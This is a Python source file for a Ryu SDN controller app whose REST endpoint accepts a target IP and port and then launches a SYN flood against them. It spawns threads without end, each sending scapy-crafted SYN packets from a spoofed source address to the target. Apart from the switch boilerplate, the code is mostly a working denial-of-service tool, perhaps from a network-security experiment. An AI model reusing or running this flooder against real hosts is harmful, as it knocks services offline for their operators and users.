import json
import logging

from ryu.app import simple_switch_13
from webob import Response
from ryu.controller import ofp_event
from ryu.controller.handler import CONFIG_DISPATCHER
from ryu.controller.handler import set_ev_cls
from ryu.app.wsgi import ControllerBase, WSGIApplication, route
from ryu.lib import dpid as dpid_lib
import json
import socket
import time
import random
import threading
import sys
from scapy.all import *


simple_switch_instance_name = 'simple_switch_api_app'
url = '/hello'
conf.iface = 'eth0'


class sendSYN(threading.Thread):

    def __init__(self, target, port):
        threading.Thread.__init__(self)
        self.target = target
        self.port = port

    def run(self):
        i = IP()
        i.src = '192.168.11.23'
        i.dst = self.target
        t = TCP()
        t.sport = random.randint(1, 65535)
        t.dport = self.port
        t.flags = 'S'
        send(i/t, verbose=0)


class SimpleSwitchRest13(simple_switch_13.SimpleSwitch13):

    _CONTEXTS = {'wsgi': WSGIApplication}

    def __init__(self, *args, **kwargs):
        super(SimpleSwitchRest13, self).__init__(*args, **kwargs)
        self.switches = {}
        wsgi = kwargs['wsgi']
        wsgi.register(SimpleSwitchController,
                      {simple_switch_instance_name: self})

    @set_ev_cls(ofp_event.EventOFPSwitchFeatures, CONFIG_DISPATCHER)
    def switch_features_handler(self, ev):
        super(SimpleSwitchRest13, self).switch_features_handler(ev)
        datapath = ev.msg.datapath
        self.switches[datapath.id] = datapath
        self.mac_to_port.setdefault(datapath.id, {})

    def store_target_Info(self, info):
        with open('../ipInfo/target.json', 'w') as f:
            f.write(json.dumps(info))
        f.close()
        return "get target info"

    def read_target_Info(self):
        total = 0
        with open('../ipInfo/target.json', 'r') as f:
            json_data = json.load(f)
            ip = json_data['target']
            port = json_data['port']

        while 1:
            sendSYN(ip, port).start()
            total += 1
            print total
        # return "read target info"


class SimpleSwitchController(ControllerBase):

    def __init__(self, req, link, data, **config):
        super(SimpleSwitchController, self).__init__(req, link, data, **config)
        self.simpl_switch_spp = data[simple_switch_instance_name]

    @route('simpleswitch', url, methods=['POST'])
    def get_target_Info(self, req, **kwargs):

        simple_switch = self.simpl_switch_spp
        Info = json.loads(req.body)

        try:
            success = simple_switch.store_target_Info(Info)
            print success
            simple_switch.read_target_Info()
        except Exception as e:
            return Response(status=500)
